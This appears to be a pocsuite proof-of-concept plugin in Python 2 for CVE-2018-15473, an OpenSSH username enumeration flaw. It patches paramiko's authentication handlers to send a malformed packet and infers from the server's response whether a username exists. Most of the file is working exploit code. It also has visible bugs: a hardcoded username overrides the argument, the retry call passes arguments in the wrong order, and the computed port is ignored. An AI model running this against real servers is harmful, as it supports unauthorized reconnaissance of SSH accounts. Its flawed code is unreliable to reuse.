#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Copyright (c) 2014-2015 pocsuite developers (http://seebug.org)
See the file 'docs/COPYING' for copying permission
"""
#命令行
from pocsuite import pocsuite_cli
#验证模块
from pocsuite import pocsuite_verify
#攻击模块
from pocsuite import pocsuite_attack
#控制台模式
from pocsuite import pocsuite_console
#requests 
from pocsuite.api.request import req
#register
from pocsuite.api.poc import register
#report
from pocsuite.api.poc import Output, POCBase
#url转换host
from pocsuite.lib.utils.funs import url2ip
import socket
import paramiko
import logging


old_parse_service_accept = paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT]
class BadUsername(Exception):
    def __init__(self):
        pass

# create malicious "add_boolean" function to malform packet
def add_boolean(*args, **kwargs):
    pass

# create function to call when username was invalid
def call_error(*args, **kwargs):
    raise BadUsername()

# create the malicious function to overwrite MSG_SERVICE_ACCEPT handler
def malform_packet(*args, **kwargs):
    old_add_boolean = paramiko.message.Message.add_boolean
    paramiko.message.Message.add_boolean = add_boolean
    result  = old_parse_service_accept(*args, **kwargs)
    #return old add_boolean function so start_client will work again
    paramiko.message.Message.add_boolean = old_add_boolean
    return result

paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = malform_packet
paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = call_error
logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())

# create function to perform authentication with malformed packet and desired username
def checkUsername(username,host, tried=0):
    username="rootasdf23"
    sock = socket.socket()
    sock.connect((host, 22))
    # instantiate transport
    transport = paramiko.transport.Transport(sock)
    try:
        transport.start_client()
    except paramiko.ssh_exception.SSHException:
        # server was likely flooded, retry up to 3 times
        transport.close()
        if tried < 4:
            tried += 1
            return checkUsername(username, tried)
        else:
            print '[-] Failed to negotiate SSH transport'
    try:
        transport.auth_publickey(username, paramiko.RSAKey.generate(1024))
    except BadUsername:
        return "1"
    except paramiko.ssh_exception.AuthenticationException:
        return "2"
    #Successful auth(?)
    raise Exception("There was an error. Is this the correct version of OpenSSH?")


#基础基类
class SS1HPOC(POCBase):
    vulID = '52'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1' #默认为1
    vulDate = '2018-08-24' #漏洞公开的时间,不知道就写今天

    author = 'fanyingjie' #  PoC作者的大名
    createDate = '2018-08-24'# 编写 PoC 的日期
    updateDate = '2018-08-24'# PoC 更新的时间,默认和编写时间一样
    references = "https://isc.sans.edu/diary/24004"# 漏洞地址来源,0day不用写
    name = 'ssh username enumeration'# PoC 名称
    appPowerLink= '#'# 漏洞厂商主页地址
    appName = 'ssh'# 漏洞应用名称
    appVersion = 'all'# 漏洞影响版本
    vulType = 'username enumeration'#漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        ssh 用户枚举 cve-2018-15473
    ''' # 漏洞简要描述
    samples = []# 测试样列,就是用 PoC 测试成功的网站
    install_requires = [] # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"中危" #严重,高危,中危,低危

    #指纹方法
    def _fingerprint(self):
        pass
        
    #验证模块 pocsuite -r 1-redis.py -u 10.1.5.26 --verify
    def _verify(self):
        result={}
        vul_url = '%s' % self.url
        import re
        import time
        import ftplib
        from pocsuite.lib.utils.funs import url2ip
        _port = re.findall(':(\d+)\s*', vul_url)
        if len(_port) != 0:
            _host = url2ip(vul_url)[0]
            _port = url2ip(vul_url)[1]
        else :
            _host = url2ip(vul_url)
            _port = 22
        
        #判断端口是否开放   
        import socket
        sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sk.settimeout(1)
        try:
            sk.connect((_host,_port))
        except Exception:
                return self.save_output(result)
        sk.close()


        


        resulta = checkUsername("rootasdf23",_host)
        if(resulta=="1"):
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = _host
            result['VerifyInfo']['Payload'] = "存在ssh 用户枚举".decode("utf8")

        return self.save_output(result)
    #攻击模块
    def _attack(self):
        result = {}
        return self._verify()


    #输出报告
    def save_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output


#注册类
register(SS1HPOC)
